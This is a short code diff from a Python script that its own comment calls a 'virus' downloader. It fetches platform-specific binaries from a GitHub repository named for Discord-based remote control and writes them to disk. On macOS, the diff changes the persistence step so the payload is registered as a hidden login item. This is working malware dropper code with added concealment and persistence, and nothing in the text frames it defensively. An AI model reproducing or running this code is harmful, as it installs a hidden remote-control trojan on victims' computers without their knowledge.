@@ -19,8 +19,8 @@ except FileNotFoundError:
 # download main virus
 
 if platform == "darwin":
-    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:false}}' > /dev/null")
     open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-mac", allow_redirects=True).content)
+    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:true}}' > /dev/null")
 elif platform == "linux":
     from os import environ
     open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-linux", allow_redirects=True).content)
